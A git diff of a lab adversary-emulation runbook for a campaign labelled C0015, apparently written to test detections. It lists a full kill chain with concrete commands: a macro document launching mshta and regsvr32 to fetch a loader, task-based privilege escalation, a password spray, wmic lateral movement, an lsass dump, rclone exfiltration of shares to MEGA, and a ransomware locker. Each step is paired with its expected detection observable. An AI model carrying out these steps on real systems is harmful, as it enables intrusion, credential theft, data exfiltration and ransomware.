@@ -1,87 +1,59 @@
 # Run order
 
-The sequence follows the campaign. Each step lists the observable that confirms it before the next
-step starts.
+The chain is driven by the document. The operator opens it and watches; every other step is performed
+by the payload or by the lab weakness described in [`gap/README.md`](../gap/README.md).
 
 ## 0. Preconditions
 
-| Check | Command | Expected |
+| Check | Where | Expected |
 |---|---|---|
-| Snapshots | hypervisor | one snapshot per host, named for the run |
-| Sysmon | `sysmon64 -c infra\sysmon\sysmon-c0015-balanced.xml` | events 1, 3, 7, 8, 10, 11, 22 present |
-| DNS | `nslookup five.azureedge.net` on WS01 | 192.168.50.100 |
-| DNS negative | `nslookup volga.azureedge.net` on WS01 | non-existent domain |
-| MEGA remote | `rclone lsd Mega:` on FS01 | lists the remote |
-| Staging | `curl http://192.168.50.1:8000/PowerView.ps1` | 200 |
+| C2 listener | Kali | `ss -ltn` shows 443 |
+| Staging | Kali | `curl http://192.168.50.100/c0015_loader.dll` returns 200 |
+| Kerberos | Kali | `klist` shows a ticket for `helpdesk@C0015.LAB` |
+| Sysmon and agent | WS01, FS01 | both services running |
+| Lab weakness | WS01 | `C:\ProgramData\C0015` writable by `Users`, task `C0015Updater` present |
+| Victim session | WS01 | an interactive session for `duc.user`, otherwise Word cannot open the document |
+| Target session | FS01 | the console session logged off, so RDP can own the single session |
+| Corpus | FS01 | `C:\C0015\corpus` intact, shares `Shares` and `Backups` present |
 
-## 1. Delivery and proxy execution
+## 1. Delivery, executed by the user
 
-1. Copy the delivery archive to the victim desktop and open the document, enabling macros.
-2. The macro writes `compareforfor.hta` and starts it through `cmd.exe /c mshta`.
-3. The HTA downloads `compareForfor.jpg` to `C:\Users\Public` and calls `regsvr32` with that path.
-4. The module registers its callback.
+1. Copy `decree-08.03.2021.docm` to the victim desktop and open it as `duc.user`.
+2. The macro writes the HTA and starts `cmd.exe /c mshta`.
+3. The HTA downloads the loader and runs `regsvr32` on it.
+4. The loader overwrites `C:\ProgramData\C0015\updater.exe`.
+5. The scheduled task starts it as SYSTEM within a minute.
 
-Confirm: `WINWORD.EXE -> cmd.exe -> mshta.exe -> regsvr32.exe` in process creation, and the unsigned
-module load from `C:\Users\Public`.
+Observable: `WINWORD.EXE -> cmd.exe -> mshta.exe -> regsvr32.exe`, a write into `ProgramData`, and a
+process started by the task scheduler from that path.
 
-## 2. Stage hosting
+## 2. Everything after SYSTEM, executed by `c0015_stage2.ps1`
 
-1. `install_stage_service.ps1` creates the service and starts it.
-2. `svchost.exe -k c0015grp` spawns `rundll32.exe C:\Users\Public\C0015\D8B3.dll`.
-3. The beacon registers; the fallback module produces failed lookups for the unresolved name.
+| Step | What it does | Observable |
+|---|---|---|
+| spray | tries four passwords against `\\WS01\IPC$` for `helpdesk` | several `4625`, then `4624` |
+| discovery | `whoami`, `nltest`, `net view`, `tasklist /s FS01` | process creation |
+| share enumeration | PowerView cradle, `Invoke-ShareFinder` | PowerShell with a download cradle |
+| staging | `143.dll`, the dump tool, the locker and three `.cmd` files over `C$` | `4624` on the target, file writes |
+| loader | `wmic /node:FS01 ... rundll32 143.dll` | `WmiPrvSE.exe -> rundll32.exe` |
+| foothold | `C0015Persist`, onstart, SYSTEM | `4698`, task XML |
+| defence | real-time protection off on the target | Defender events |
+| injection | `inject.cmd` against the per-user service host | `E8` into `svchost.exe` |
+| dump | `dump.cmd`, output to `dump.txt` | `E10` into `lsass.exe` |
+| exfiltration | rclone over `\\FS01\Shares` to MEGA | the rclone command line |
+| impact | `locker.bat` on the target | notes and renamed files |
 
-Confirm: `svchost.exe -> rundll32.exe`, the unsigned module hash, and repeated `QueryStatus 9003`.
+## 3. Interactive stage, executed by the operator
 
-## 3. Injection into winlogon
+1. Log the console session off on FS01 so RDP can own the only session.
+2. `kinit helpdesk@C0015.LAB`, then
+   `xfreerdp /v:192.168.50.30 /u:helpdesk /d:C0015.LAB /sec:nla`.
+3. Within the session, `taskmgr /4` from the shell.
 
-1. From the rundll32 session, `migrate --process-name winlogon.exe`.
-2. Select the new session and confirm `whoami` returns `nt authority\system`.
-3. Run one command and confirm the parent image in process creation.
+Observable: `4624` type 10 for `helpdesk`, a `rdp-tcp` session, `taskmgr.exe` with parent
+`explorer.exe`.
 
-Confirm: thread creation into `winlogon.exe`, and a child process whose parent is `winlogon.exe`.
+## 4. After the run
 
-## 4. Discovery
-
-1. Run `discovery-runbook.ps1` from the winlogon session.
-2. Run `invoke-sharefinder.ps1` and confirm `C:\ProgramData\found_shares.txt`.
-
-Confirm: one `cmd.exe` per command with `winlogon.exe` as parent, and the enumeration file.
-
-## 5. Lateral movement to the backup server
-
-1. Stage `143.dll` to `\\FS01\C$\ProgramData\143.dll`.
-2. Run the pivot: `wmic /node:FS01 process call create "rundll32.exe C:\ProgramData\143.dll DllRegisterServer"`.
-3. Confirm `WmiPrvSE.exe -> rundll32.exe` on FS01 and the new session.
-
-Confirm: the provider-host edge, the unsigned module load on the target, and the callback from FS01.
-
-## 6. Injection into the service host
-
-1. Find the PID of `svchost.exe -k UnistackSvcGroup -s CDPUserSvc`.
-2. `migrate --pid <pid>`.
-3. Confirm the callback originates from `svchost.exe`.
-
-## 7. Interactive access
-
-1. `socks5 start`, then connect the RDP client through the proxy.
-2. Open the backup console; start Task Manager from the Start menu.
-3. Confirm `taskmgr.exe /4` with `explorer.exe` as parent.
-
-## 8. Exfiltration, round 1
-
-1. `rclone-exfil.ps1 -Source \\FS01\Shares -Round 1`.
-2. Confirm the process command line, the egress connection, and the remote listing.
-
-## 9. Second round and remote access
-
-1. On the next run day, repeat the transfer with `--ignore-existing`.
-2. Place AnyDesk in the user Videos directory and start it.
-3. Place ProcessHacker at `C:\`, dump `lsass.exe`, parse the dump offline.
-
-## 10. Impact and restore
-
-1. `run-impact.ps1 -Action Prepare` to copy and hash the corpus.
-2. `run-impact.ps1 -Action Run` to execute `locker.bat` from the backup server.
-3. `run-impact.ps1 -Action Verify` to count notes and renamed files.
-4. `run-impact.ps1 -Action Rollback` and confirm the hash comparison passes.
-5. Remove the staged binaries, the service, the dump, and the MEGA object.
+Collect the alerts for the window, compare them with the table in
+[`killchain/README.md`](../killchain/README.md), then restore the corpus and remove the staged files.
